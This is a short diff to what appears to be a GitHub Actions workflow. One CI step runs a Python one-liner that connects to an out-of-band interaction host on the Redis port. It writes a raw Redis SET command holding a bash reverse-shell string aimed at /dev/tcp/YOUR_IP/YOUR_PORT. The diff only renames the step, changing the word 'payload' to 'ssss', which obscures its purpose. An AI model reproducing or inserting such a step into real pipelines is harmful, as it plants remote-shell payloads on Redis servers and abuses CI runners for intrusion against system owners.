@@ -8,5 +8,5 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Send raw Gopher payload to Redis on target (one line)
+      - name: Send raw Gopher ssss to Redis on target (one line)
         run: python3 -c "import socket; s=socket.create_connection(('c6joc6b4h4fgaa86cdra1b0y0p6guii7.oastify.com', 6379)); s.sendall(b'*3\r\n$3\r\nSET\r\n$5\r\nshell\r\n$29\r\nbash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1\r\n'); print(s.recv(1024)); s.close()"
